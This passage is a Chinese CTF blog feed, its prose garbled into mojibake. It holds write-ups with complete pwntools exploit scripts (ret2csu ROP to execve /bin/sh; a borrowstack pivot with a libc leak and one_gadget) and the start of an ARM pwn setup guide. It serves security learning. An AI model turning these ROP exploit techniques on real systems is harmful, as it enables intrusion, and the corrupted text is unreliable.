src="/../img/2706180-20220218171824552-2132934623.png"></p><p>åŒæ—¶å‘ç°äº†è¿™é‡Œæ”¹å˜äº†raxçš„å€¼ï¼Œæ”¹æˆäº†0x3bï¼Œä¹Ÿå°±ç³»ç»Ÿè°ƒç”¨execveå‡½æ•°ã€‚</p><p>å‘ç°åªèƒ½æ§åˆ¶rdiçš„å€¼ï¼Œè€Œä¸èƒ½æ§åˆ¶rsi,rdxçš„å€¼</p><p><img src="/../img/2706180-20220218171833959-1096288017.png"></p><p>é‚£æ€è·¯å°±å‡ºæ¥äº†ã€‚</p><p>æˆ‘ä»¬åˆ©ç”¨ret2csuæ§åˆ¶rsiå’Œrdxå‚æ•°ï¼Œæœ€åæ‰§è¡ŒMov rax,0x3bï¼›syscallå³å¯ã€‚</p><p>é‚£åªæœ‰ä¸€ä¸ªé—®é¢˜äº†ï¼Œä¹Ÿæ˜¯è¿™é“é¢˜çš„éš¾ç‚¹ï¼Œæ€ä¹ˆæŠŠrdiå­˜å…¥å‚æ•°çš„åœ°å€ã€‚</p><p>æˆ‘æœ€å¼€å§‹æƒ³çš„æ˜¯æ‰§è¡Œä¸€ä¸ªret2csuå»æŠŠå‚æ•°ç»™å†™è¿›bssæ®µï¼Œå¯æ˜¯æˆ‘ä»¬ç”±äºæ§åˆ¶ä¸äº†raxçš„å€¼ï¼Œå°±æ²¡åŠæ³•ç³»ç»Ÿè°ƒç”¨å·è®¾ç½®æˆ0,ã€‚</p><p>é‚£bssæ®µå†™ä¸äº†ï¼Œåªèƒ½å†™å…¥ç¨‹åºç»™æˆ‘ä»¬æŒ‡å®šçš„åœ°æ–¹äº†ï¼Œå¯æ˜¯è¿™å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦æ³„éœ²æ ˆä¸­åœ°å€ã€‚ä»¥å‰åªé‡è§è¿‡ç¨‹åºè‡ªå·±æ³„éœ²ä¸€ä¸ªæ ˆçš„åœ°å€çš„ï¼Œè¿™é“é¢˜ä¹Ÿç®—æ˜¯é•¿è§è¯†äº†ï¼Œè§äº†ä¸€ç§æ–°æ–¹æ³•ã€‚</p><p>ç³»ç»Ÿè°ƒç”¨writeçš„æ—¶å€™ï¼Œ<br><img src="/../img/2706180-20220218171846029-2137483481.png"></p><p>ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯0x30ï¼Œå¯æ˜¯æˆ‘ä»¬å‘ç°<br><img src="/../img/2706180-20220218171854501-342656814.png"></p><p>Bufè·ç¦»æ ˆåº•ä»…ä»…æœ‰åä¸ªå­—èŠ‚ã€‚å› æ­¤writeæ˜¯å¯ä»¥æ‰“å°å‡ºæ¥æ ˆä¸­å†…å®¹çš„ã€‚å¹¶ä¸”æˆ‘ä»¬è¿è¡Œç¨‹åºä¹Ÿå¯ä»¥å‘ç°æ˜¯æœ‰ç«¯å€ªçš„ã€‚</p><p><img src="/../img/2706180-20220218171903218-1711747126.png"></p><p>ä¸ä»…ä»…æ‰“å°å‡ºæ¥äº†æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼Œè¿˜æ‰“å°å‡ºæ¥äº†ä¸€äº›ä¹±ç ã€‚</p><p>æˆ‘ä»¬å…ˆç®€å•å†™ä¸€ä¸ªè„šæœ¬</p><p><img src="/../img/2706180-20220218171915304-1425594620.png"></p><p>è¿™ä¸ªè„šæœ¬å°±æ˜¯å‘é€ä¸€ä¸ª1ï¼Œä½†æ˜¯å¯ä»¥çœ‹è§æˆ‘ä»¬æ¥æ”¶çš„å†…å®¹ã€‚</p><p><img src="/../img/2706180-20220218171922519-1774565205.png"></p><p>æ­¤æ—¶å¯ä»¥çœ‹è§æˆ‘ä»¬å·²ç»æ³„éœ²å‡ºæ¥äº†æ ˆçš„å†…å®¹ã€‚</p><p>æˆ‘ä»¬ç”¨gdbçœ‹ä¸€ä¸‹</p><p><img src="/../img/2706180-20220218171929967-1280624006.png"></p><p>æ³„éœ²çš„å†…å®¹æ˜¯çº¢çº¿çš„éƒ¨åˆ†ï¼ˆå½“ç„¶ç”±äºåªèƒ½æ³„éœ²0x30ä¸ªå­—èŠ‚ï¼Œæˆ‘çº¢çº¿åœˆå¤šäº†ï¼Œä½†æ˜¯æˆ‘æƒ³å¼ºè°ƒçš„æ˜¯æ ˆåœ°å€æ³„éœ²ï¼Œæ³„éœ²çš„æ˜¯å†…å®¹ï¼Œè€Œéæ ˆçš„åœ°å€ï¼‰</p><p>ä¸è¿‡æˆ‘ä»¬å‘ç°äº†ç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ³„éœ²çš„æ ˆä¸­çš„å†…å®¹æ˜¯æŒ‡å‘äº†æ ˆçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨æ³„éœ²çš„æ ˆçš„å†…å®¹é…åˆåç§»ï¼Œæ¥è·å–æ ˆçš„åœ°å€äº†ã€‚</p><p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œvulå‡½æ•°çš„è¿”å›åœ°å€å°±æ˜¯æ­¤æ—¶æ ˆé¡¶çš„ï¼Œæˆ‘ä»¬æ˜¯è¦åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµï¼Œå› æ­¤ç¬¬ä¸€ä¸ªåœ°å€è‚¯å®šæ˜¯æ²¡æ³•æ³„éœ²äº†ï¼Œæˆ‘ä»¬æ¥æ³„éœ²ç¬¬ä¸‰ä¸ªæ ˆçš„å†…å®¹ã€‚ç„¶åæŠŠè¿”å›åœ°å€å¡«å†™æˆvulå‡½æ•°çš„é¦–åœ°å€ï¼Œè®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡ï¼ˆå»è¿›è¡Œret2csuï¼‰</p><p>æ‹¿åˆ°æ ˆä¸­ç¬¬ä¸‰ä¸ªå†…å®¹åï¼Œçœ‹ä¸€ä¸‹å®ƒè·ç¦»æˆ‘ä»¬è¾“å…¥çš„å†…å®¹çš„é¦–åœ°å€åç§»æ˜¯å¤šå°‘ã€‚<br><img src="/../img/2706180-20220218171939424-200600591.png"></p><p>F088æ˜¯æ³„éœ²çš„åœ°å€ï¼Œdf70æ˜¯è¾“å…¥å­˜å‚¨çš„é¦–åœ°å€ï¼ˆæˆ‘æ‰“ç®—æŠŠ&#x2F;bin&#x2F;shè¾“å…¥åˆ°è¿™ä¸ªåœ°æ–¹ï¼‰</p><p>ç„¶åå°±æ²¡ä»€ä¹ˆäº†ï¼Œåç§»æ‹¿åˆ°ä¹‹åï¼Œå°±å¯ä»¥å†™expäº†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28000</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span> <span class="comment">#è¿™ä¸ªåœ°å€å¹¶ä¸æ˜¯term_procçš„åœ°å€ï¼Œè€Œæ˜¯æŒ‡å‘term_procçš„åœ°å€</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>) <span class="comment">#è¿™ä¸ªç”¨æ¥ç­›é€‰ä¸€ä¸‹æˆ‘ä»¬è¦æ‰¾çš„æ•°æ®</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(term_proc)  <span class="comment">#æ­¤æ—¶callä¸€ä¸ªç©ºå‡½æ•°ï¼Œæˆ‘ä»¬ç”¨retæ¥åŠ«æŒæ‰§è¡Œæµ</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#r13 r14 r15</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(modify_rax)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bin_sh_addr) <span class="comment">#æŠŠå‚æ•°æ”¾åˆ°rdié‡Œé¢</span></span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="BUUCTFä¸Šçš„gyctf-2020-borrowstack"><a href="#BUUCTFä¸Šçš„gyctf-2020-borrowstack" class="headerlink" title="BUUCTFä¸Šçš„gyctf_2020_borrowstack"></a>BUUCTFä¸Šçš„gyctf_2020_borrowstack</h3><p>è¿™é“é¢˜ï¼Œæˆ‘å·²ç»åœ¨æ ˆè¿ç§»çš„é‚£ç¯‡åšå®¢ä¸­å‘è¿‡äº†ï¼Œè¿™ç¯‡é‡Œé¢æˆ‘å°±å±•ç¤ºä¸€ä¸‹WPå§ï¼Œå…·ä½“ç»†èŠ‚å¯ä»¥çœ‹ä¸€ä¸‹æ ˆè¿ç§»çš„é‚£ç¯‡åšå®¢ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#callå‡½æ•°ä¸ºè·³è½¬åˆ°æŸåœ°å€å†…æ‰€ä¿å­˜çš„åœ°å€ï¼Œåº”è¯¥ä½¿ç”¨gotè¡¨ä¸­çš„åœ°å€</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#è¿™é‡Œå¤šåŠ 0x40çš„ç›®çš„å°±æ˜¯ä¸ºäº†æ‰§è¡Œputsçš„æ—¶å€™ï¼Œä¸å½±å“ä¹‹å‰çš„gotè¡¨ä¸­çš„æ•°æ®</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#è¿™ä¸€ä¸ª4006E0ä»…ä»…æ˜¯ret2csuæ‰§è¡Œäº†popä¹‹åçš„retçš„è¿”å›çš„åœ°å€ã€‚</span></span><br><span class="line"><span class="comment">#è‡³äºæ€ä¹ˆè¿”å›åˆ°one_gadgetä¸Šçš„ï¼Œæ˜¯å› ä¸ºreadçš„è¿”å›åœ°å€è¢«readè‡ªå·±ç»™æ”¹äº†</span></span><br><span class="line"><span class="comment">#payload2ä¸­çš„ç¬¬ä¸€ä¸ªp64(0)æ˜¯å»å ä¸ªåœ°æ–¹ï¼Œå› ä¸ºæ ˆè¿ç§»æœ¬èº«çš„ç‰¹æ€§ï¼Œè¿ç§»åçš„ç¬¬ä¸€ä¸ªå†…å­˜å•å…ƒä¸æ‰§è¡Œ</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #åªè¦æ˜¯å‘é€åœ°å€ å°±è¦ç»è¿‡æ‰“åŒ…ä¹‹åå‘é€</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../img/2706180-20220416083237696-1901804155.png"></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re2csu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºå­¦ä¹ armæ¶æ„ä¸‹çš„pwnçš„æ€»ç»“</title>
      <link href="/posts/536aee5b.html"/>
      <url>/posts/536aee5b.html</url>
      
        <content type="html"><![CDATA[<p>é€šè¿‡è¿™æ®µæ—¶é—´å¯¹äºarmæ¶æ„çš„é¢˜ç›®å­¦ä¹ ï¼Œè‡ªè®¤ä¸ºæ”¶è·è¿˜æ˜¯ä¸å°‘çš„ã€‚ä¸‹é¢æ˜¯å¯¹äºè¿™æ®µæ—¶é—´å…³äºarmæ¶æ„çš„pwné¢˜å­¦ä¹ æ‰€è¿›è¡Œçš„æ€»ç»“ã€‚ï¼ˆæˆ‘å…¶å®è¿˜æƒ³å†å¤šåšå‡ é“armæ¶æ„çš„æ ˆé¢˜çš„ï¼Œå¯æ˜¯ç½‘ä¸Šæ‰€æ‰¾åˆ°çš„å®åœ¨ä¸å¤šï¼Œç­‰å†é‡åˆ°æ–°çš„armæ¶æ„é¢˜ç›®ï¼Œæˆ‘å†æ·»åˆ°è¿™ç¯‡æ–‡ç« ä¸Šå§ï¼‰</p><h1 id="è¿è¡Œç¨‹åº-amp-amp-å¯åŠ¨è°ƒè¯•"><a href="#è¿è¡Œç¨‹åº-amp-amp-å¯åŠ¨è°ƒè¯•" class="headerlink" title="è¿è¡Œç¨‹åº&amp;&amp;å¯åŠ¨è°ƒè¯•"></a>è¿è¡Œç¨‹åº&amp;&amp;å¯åŠ¨è°ƒè¯•</h1><p>å’‹è£…çš„ç¯å¢ƒå·²ç»å¿˜è®°äº†â€¦ï¼ˆè£…å®Œç¯å¢ƒè¿‡äº†ä¸€æ®µæ—¶é—´æ‰å¼€å§‹armæ¶æ„çš„å­¦ä¹ ï¼‰è£…é…ç¯å¢ƒçš„è¯ï¼Œä¸Šç½‘æœä¸€ä¸‹æ–‡ç« ä¹Ÿä¸å°‘ã€‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«   <a href="https://blog.csdn.net/A951860555/article/details/116780827#_4">(26æ¡æ¶ˆæ¯) CTF pwn â€“ ARMæ¶æ„çš„pwné¢˜è¯¦è§£___lifanxinçš„åšå®¢-CSDNåšå®¢</a></p><p>è®°å½•ä¸€ä¸‹æ€ä¹ˆå¯åŠ¨ä»¥åŠè°ƒè¯•armæ¶æ„çš„ç¨‹åºã€‚</p><p>å…ˆchecksecä¸€ä¸‹ï¼ˆæˆ–è€…ç”¨fileå‘½ä»¤ä¹Ÿè¡Œï¼‰ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆæ¶æ„çš„ã€‚</p><p><img src="/../img/2706180-20220330143502376-463880438.png"></p><p><img src="/../img/2706180-20220330143527102-656865950.png"></p><p>fileå‘½ä»¤å¯ä»¥æŸ¥çœ‹ç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥è¿˜æ˜¯é™æ€é“¾æ¥ã€‚</p><h2 id="è¿è¡Œç¨‹åº"><a href="#è¿è¡Œç¨‹åº" class="headerlink" title="è¿è¡Œç¨‹åº"></a>è¿è¡Œç¨‹åº</h2><p>å¦‚æœç¨‹åºæ˜¯é™æ€é“¾æ¥å¹¶ä¸”æ˜¯32ä½ armæ¶æ„çš„è¯ï¼Œè¾“å…¥qemu-arm .&#x2F;ç¨‹åºå</p><p>å¦‚æœç¨‹åºæ˜¯é™æ€é“¾æ¥å¹¶ä¸”æ˜¯aarch64æ¶æ„çš„è¯ï¼Œè¾“å…¥qemu-aarch .&#x2F;ç¨‹åºå</p><p>å¦‚æœç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥ä¸”æ˜¯32ä½ armæ¶æ„çš„è¯ï¼Œè¾“å…¥qemu-arm -L  &#x2F;usr&#x2F;arm-linux-gnueabihf .&#x2F;ç¨‹åºå</p><p>å¦‚æœç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥ä¸”æ˜¯aarch64æ¶æ„çš„è¯ï¼Œè¾“å…¥qemu-aarch64 -L &#x2F;usr&#x2F;aarch64-linux-gnu  .&#x2F;ç¨‹åºå</p><h2 id="å¯åŠ¨è°ƒè¯•"><a href="#å¯åŠ¨è°ƒè¯•" class="headerlink" title="å¯åŠ¨è°ƒè¯•"></a>å¯åŠ¨è°ƒè¯•</h2><p><strong>å¯åŠ¨è°ƒè¯•å’Œè¿è¡Œç¨‹åºçš„å‘½ä»¤å¾ˆç›¸ä¼¼ï¼Œä»…ä»…æ˜¯åŠ äº†ä¸€ä¸ªå‚æ•°-g ç„¶ååé¢è·Ÿä¸€ä¸ªç«¯å£</strong>ã€‚</p><p>æ¯”å¦‚ç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥çš„32ä½ armæ¶æ„çš„è¯ï¼Œè¾“å…¥qemu-arm -g 1234 -L &#x2F;usr&#x2F;aarch64-linux-gnu .&#x2F;ç¨‹åºå</p><p>è¿™ä¸ª1234æ˜¯ä½ æŒ‡å®šçš„ç«¯å£ï¼ŒæŒ‡å®šåˆ«çš„ç«¯å£ä¹Ÿå¯ä»¥ã€‚ç„¶åå‚ç…§è¿è¡Œç¨‹åºé‚£å››ä¸ªå‘½ä»¤ä»¥åŠä¸Šé¢è¿™ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥ä¾æ¬¡ç±»æ¨å‡ºè°ƒè¯•aarch64æ¶æ„çš„å‘½ä»¤äº†ã€‚</p><p>æ­¤æ—¶å†æ‰“å¼€å¦ä¸€ä¸ªç»ˆç«¯ï¼Œè¾“å…¥gdb-multiarchï¼ˆ<strong>å¿…é¡»æ˜¯ç”¨pwndbgï¼Œå¦‚æœæ˜¯pedaçš„è¯ï¼Œæ˜¯æ²¡æ³•æ­£å¸¸è°ƒè¯•çš„</strong>ï¼‰</p><p>ç„¶åå†è¾“å…¥target remote localhost:1234   è¿æ¥åˆ°åˆšæ‰å¼€çš„é‚£ä¸ªç«¯å£ã€‚</p><p><img src="/../img/2706180-20220330143540210-194090059.png"></p><p>è¿›å…¥è°ƒè¯•æ•ˆæœå¦‚å›¾</p><p><img src="/../img/2706180-20220330143550778-303416150.png"></p><p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œarmæ¶æ„è¿›å»è°ƒè¯•ä¼¼ä¹ä¸æ˜¯ä»mainå‡½æ•°å¼€å§‹çš„ï¼Œå¦‚æœå•æ­¥çš„è¯éœ€è¦èµ°å¾ˆä¹…å¾ˆä¹…ï¼Œå¯ä»¥è¿›å»ä¹‹åç”¨båœ¨æƒ³åœç•™çš„é‚£ä¸ªåœ°æ–¹ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åcè¿‡å»ï¼Œè¿™æ ·ä¼šå¿«å¾ˆå¤šã€‚</p><h2 id="é‡è§çš„æŠ¥é”™"><a href="#é‡è§çš„æŠ¥é”™" class="headerlink" title="é‡è§çš„æŠ¥é”™"></a>é‡è§çš„æŠ¥é”™</h2><p>1ã€å¦‚æœ32ä½é‡è§è¿™ä¸ªæŠ¥é”™çš„è¯ï¼š&#x2F;lib&#x2F;ld-linux-armhf.so.3: No such file or directory    </p><p>è¾“å…¥å‘½ä»¤sudo apt-get install libc6-armhf-cross</p><p>2ã€å¦‚æœé‡è§è¿™ä¸ªæŠ¥é”™çš„è¯ï¼šInvalid ELF image for this architecture</p><p>å°±è¯´æ˜ä½ çš„qemuåé¢è·Ÿçš„å‚æ•°ä¸å¯¹ï¼Œå°±æ¯”å¦‚ä½ è¿™ä¸ªç¨‹åºæ˜¯aarch64æ¶æ„çš„ï¼Œä½†æ˜¯ä½ qemuåé¢è·Ÿçš„æ˜¯-armã€‚å¦‚æœä½ è¿™ä¸ªç¨‹åºæ˜¯aarch64æ¶æ„çš„ï¼Œæ­£ç¡®åšæ³•åº”è¯¥æ˜¯qemuåé¢è·Ÿç€-aarch64</p><p>ç„¶åå…³äºarmæ¶æ„ä¸‹çš„æŒ‡ä»¤ï¼Œåœ¨ç½‘ä¸Šèƒ½æœåˆ°å¾ˆå¤šï¼Œä¹Ÿè§£é‡Šçš„æ¯”è¾ƒæ¸…æ¥šï¼Œæˆ‘å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†ã€‚</p><p>ä¸‹é¢ä¸‰é“ä¾‹é¢˜ï¼ˆå…¶å®æˆ‘æ˜¯æƒ³å¤šå†™å‡ é“çš„ï¼Œä½†æ˜¯åœ¨ç½‘ä¸Šæ‰¾åˆ°å¯ä¸‹è½½çš„é¢˜ç›®åªæœ‰è¿™ä¸‰é“ï¼ˆè¿˜æœ‰ä¸ªå †é¢˜ï¼Œç­‰å­¦å †äº†å†åšï¼‰ï¼‰çš„ä¸‹è½½é“¾æ¥ï¼š</p><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr">https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr</a> æå–ç : ecpr </p><h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>é€šè¿‡è¿™é“é¢˜çš„æ”¶è·ä¸å­¦ä¹ æœ‰ï¼š</p><p>1ã€è¿™æ˜¯åšçš„ç¬¬ä¸€é“armæ¶æ„çš„é¢˜ç›®ï¼Œè€ƒå¯Ÿçš„å°±æ˜¯æœ€ç®€å•çš„ropï¼Œå­¦ä¹ åˆ°äº†arm32çš„å¯„å­˜å™¨ä¼ å‚æ–¹å¼ï¼Œä»¥åŠæœ€ç®€å•çš„ropåˆ©ç”¨ã€‚</p><p>2ã€åœ¨é¢å¯¹é™æ€é“¾æ¥çš„ç¨‹åºï¼ŒIDAæ‰“å¼€ä¹‹åä¼šå‘ç°é‡Œé¢æœ‰å‡ ç™¾ä¸ªå‡½æ•°ï¼Œè€Œä¸”ä¹Ÿæœä¸åˆ°mainå‡½æ•°ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æœ<strong>ç´¢å…³é”®å­—ç¬¦ä¸²ï¼Œé€šè¿‡å…³é”®å­—ç¬¦ä¸²å»æ‰¾ä¸»å‡½æ•°</strong>ã€‚</p><p>3ã€ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘çš„é”™è§‰ï¼Œåœ¨è€ƒå¯Ÿç®€å•çš„ropæƒ…å†µä¸‹ï¼Œä¼¼ä¹å¸ˆå‚…ä»¬éƒ½æ²¡æœ‰å»èŠ±å¾ˆå¤šçš„ç²¾åŠ›å»æŸ¥çœ‹idaç”Ÿæˆçš„ä¼ªä»£ç ï¼ˆç¡®å®ä¼ªä»£ç å¤ªå¤šäº†ï¼‰ï¼Œç›´æ¥gdbæ‰“å¼€çœ‹å®Œåç§»å°±æ˜¯å¹²ã€‚</p><p>4ã€åœ¨é¢å¯¹é™æ€é“¾æ¥çš„ç¨‹åºï¼Œä»idaä¸­åˆ†æå¯èƒ½ä¼šå¼‚å¸¸çš„éº»çƒ¦ï¼Œå¦‚æœæœ‰å¯èƒ½çš„è¯ï¼Œå…¶å®å¯ä»¥é è¾“å…¥å†…å®¹ä¹‹åè§‚å¯Ÿç¨‹åºçš„å›æ˜¾ï¼ŒçŒœæµ‹ä¸€äº›ç¨‹åºåŠŸèƒ½ã€‚</p><h2 id="ä¿æŠ¤ç­–ç•¥"><a href="#ä¿æŠ¤ç­–ç•¥" class="headerlink" title="ä¿æŠ¤ç­–ç•¥"></a>ä¿æŠ¤ç­–ç•¥</h2><p><img src="/../img/2706180-20220330143602189-496528067.png"></p><h2 id="IDAåˆ†æ"><a href="#IDAåˆ†æ" class="headerlink" title="IDAåˆ†æ"></a>IDAåˆ†æ</h2><p>æ‰“å¼€IDAä¹‹åï¼Œå¯ä»¥å‘ç°æ˜¯é™æ€é“¾æ¥ï¼Œæ—è¾¹æœ‰éå¸¸å¤šçš„å‡½æ•°ï¼Œéš¾ä»¥è¿…é€Ÿå®šä½åˆ°ä¸»å‡½æ•°ã€‚å› æ­¤é‡‡ç”¨ä¸€ç§æ¯”è¾ƒå¥½ç”¨çš„æ–¹æ³•ã€‚</p><p>å…ˆè¿è¡Œä¸€ä¸‹è¿™ä¸ªç¨‹åºï¼Œå‘ç°æœ‰è¿™ç§å­—ç¬¦ä¸²</p><p><img src="/../img/2706180-20220330143615732-1043244594.png"></p><p>é‚£å°±åœ¨IDAé‡Œé¢ç”¨shift+F12ï¼ŒæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><img src="/../img/2706180-20220330143624039-802565433.png"></p><p>ç„¶åçœ‹ä¸€ä¸‹å¼•ç”¨ï¼Œå¦‚æ­¤å°±å¯ä»¥æ‰¾åˆ°ä¸»å‡½æ•°äº†</p><p><img src="/../img/2706180-20220330143632149-590724454.png"></p><p>è·³åˆ°æ±‡ç¼–ä»£ç å¤„ï¼ŒF5ä¸€ä¸‹ï¼Œå³å¯çœ‹åˆ°ä¸»å‡½æ•°çš„ä¼ªä»£ç ï¼ˆç›´æ¥æœmainå‡½æ•°çš„è¯ï¼Œä¹Ÿæ˜¯æœä¸åˆ°çš„ï¼‰</p><p><img src="/../img/2706180-20220330143641480-1941741546.png"></p><p>ç›´æ¥çœ‹ä¼ªä»£ç æœ‰ç‚¹æ‡µï¼Œå…ˆè¾“å…¥ä¸€äº›åƒåœ¾æ•°æ®ï¼ˆç¬¬ä¸€æ¬¡å¿…é¡»è¦è¾“å…¥ä¸€ä¸ªå›è½¦ï¼‰ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨æº¢å‡º</p><p><img src="/../img/2706180-20220330143649674-663002508.png"></p><p>å‘ç°æ®µé”™è¯¯äº†ï¼Œé‚£å°±è¯´æ˜å­˜åœ¨æº¢å‡ºã€‚ç„¶åç”¨gdbè°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æº¢å‡ºæ˜¯å¤šå°‘ã€‚</p><p>æœ€åˆæˆ‘ä¼å›¾ç”¨gdbå•æ­¥åˆ°è¾“å…¥å‡½æ•°ï¼Œç„¶åè¾“å…¥åƒåœ¾æ•°æ®ï¼Œä¸è¿‡å•æ­¥äº†å¾ˆä¹…å‘ç°ä¾æ—§æ²¡æœ‰åˆ°å¯è¾“å…¥çš„åœ°æ–¹ï¼Œé€šè¿‡å»çœ‹å…¶ä»–å¸ˆå‚…çš„åšå®¢ï¼Œå‘ç°äº†ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹æ³•ã€‚<strong>æˆ‘ä»¬å¯åŠ¨gdbä¹‹åç›´æ¥è¾“å…¥cã€‚cçš„æœ¬æ„æ˜¯å»continueåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œå¯æ˜¯æˆ‘ä»¬å‹æ ¹å°±æ²¡æœ‰ä¸‹æ–­ç‚¹ï¼Œå› 